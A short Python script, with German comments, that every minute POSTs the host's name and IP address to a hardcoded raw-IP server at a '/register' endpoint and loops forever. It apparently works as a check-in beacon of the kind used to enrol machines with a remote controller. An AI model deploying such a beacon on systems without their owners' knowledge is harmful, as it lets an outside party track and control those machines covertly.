import requests
import socket
import time

SERVER_URL = 'http://45.149.78.188:8082/register'  # URL des Servers zum Registrieren

def get_device_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return {'hostname': hostname, 'ip': ip_address}

def register_with_server():
    while True:
        try:
            device_info = get_device_info()
            response = requests.post(SERVER_URL, json=device_info)
            if response.status_code == 200:
                print('Successfully registered with the server')
            else:
                print(f'Failed to register: {response.status_code}')
        except Exception as e:
            print(f'Error: {e}')
        time.sleep(60)  # Melde jede Minute

if __name__ == '__main__':
    register_with_server()
